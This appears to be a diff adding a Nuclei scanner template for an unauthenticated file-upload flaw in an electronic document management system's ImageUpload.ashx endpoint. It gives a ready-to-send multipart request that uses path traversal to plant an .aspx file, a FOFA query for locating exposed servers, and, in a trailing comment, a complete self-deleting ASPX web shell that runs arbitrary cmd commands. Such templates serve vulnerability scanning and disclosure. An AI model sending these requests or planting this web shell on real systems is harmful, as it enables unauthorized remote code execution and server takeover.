@@ -1,0 +1,59 @@
+id: data-management-system-fileupload
+info:
+  name: 电子资料管理系统 ImageUpload.ashx - 文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 电子资料管理系统 /Menu/ImageManger/ImageUpload.ashx 接口存在文件上传漏洞，未经身份验证的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%B5%E5%AD%90%E8%B5%84%E6%96%99%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E7%94%B5%E5%AD%90%E8%B5%84%E6%96%99%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FImageUpload.ashx%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="Menu/Login/ThirdLoginHandler.ashx"
+  tags: data-management,fileupload
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y/%M/%D")}}'
+
+http:
+  - raw:
+      - |
+        POST /Menu/ImageManger/ImageUpload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Upgrade-Insecure-Requests: 1
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="isUpload"
+
+        印章图片
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="entid"
+
+        666
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="Type"
+
+        1
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+        Content-Disposition: form-data; name="Filedata"; filename="../{{filename}}.aspx"
+        Content-Type: text/plain
+
+        <% Response.Write("{{randstr}}") %>
+        ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+      
+      - |+
+        GET /{{filename}}.aspx HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'{{randstr}}')
+        condition: and
+
+# <%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());System.IO.File.Delete(Request.PhysicalPath);Response.End();%>
